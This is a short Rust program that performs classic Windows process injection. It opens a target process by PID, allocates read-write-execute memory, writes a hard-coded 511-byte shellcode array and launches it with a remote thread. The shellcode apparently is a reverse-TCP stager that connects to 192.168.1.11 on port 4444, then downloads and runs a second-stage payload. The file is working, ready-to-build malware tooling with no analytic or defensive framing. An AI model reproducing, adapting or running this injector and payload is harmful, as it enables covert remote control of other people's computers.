use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThreadEx};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::handleapi::CloseHandle;
use winapi::ctypes::c_void;
use std::ptr::null_mut;
use std::mem::transmute;

const K: &str = "[+]";
const E: &str = "[-]";
const I: &str = "[*]";

fn main()
{
    const SHELLCODE: [u8; 511] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x56,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,0x48,0x01,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x01,0x0b,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5];


    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        println!("{} Usage: program.exe <PID>", E);
        std::process::exit(1);
    } 
    let mut dw_tid: u32 = 0;
    let dw_pid = args[1].parse().unwrap_or_else(|_| {
        println!("{} Invalid PID", E);
        std::process::exit(1);
    });

    /* Open a handle to the process */
    println!("{} trying to get a handle to the process ({})", I, dw_pid);
    let h_process = unsafe { OpenProcess(0xFFFF, 0, dw_pid) };
    if h_process.is_null() {
        unsafe { println!("{} Failed to get a handle to the process [{}] error: {}", E, dw_pid, GetLastError()); }
        std::process::exit(1);
    }
    println!("{} Got a handle to the process!", K);
    /* Allocate bytes to process memory */
    let r_buffer = unsafe { VirtualAllocEx(h_process, null_mut(), SHELLCODE.len(), 0x00001000 | 0x00002000, 0x40) };
    println!("{} Allocated {} bytes with PAGE_EXECUTE_READWRITE permissions", K, SHELLCODE.len());
    
    /* Write allocated memory to the process memory */
    unsafe { WriteProcessMemory(h_process, r_buffer, SHELLCODE.as_ptr() as *const c_void, SHELLCODE.len(), null_mut()); } 
    println!("{} Wrote {} bytes to process memory", K, SHELLCODE.len());

    //  Create thread to run the payload 
    //  Some(transmute(r_buffer)) Specify the starting point of the thread
    let h_thread = unsafe { CreateRemoteThreadEx(h_process, null_mut(), 0, Some(transmute(r_buffer)), null_mut(), 0, null_mut(), &mut dw_tid) }; 
    if h_thread.is_null() {
        unsafe { println!("{} Failed to get a handle to the threads, error: {}", E, GetLastError()); 
        CloseHandle(h_process); }
        std::process::exit(1);
    }
    println!("{} Got a handle to the thread ({})", K, dw_tid);

    println!("{} Wait for process to stop...", I);
    unsafe { WaitForSingleObject(h_process, 0xFFFFFFFF); } // 0xFFFFFFFF Work as an INFINITE
    println!("{} Cleaning ...", I);
    unsafe {
        CloseHandle(h_thread);
        CloseHandle(h_process);
    }

}
// P.D.M :.
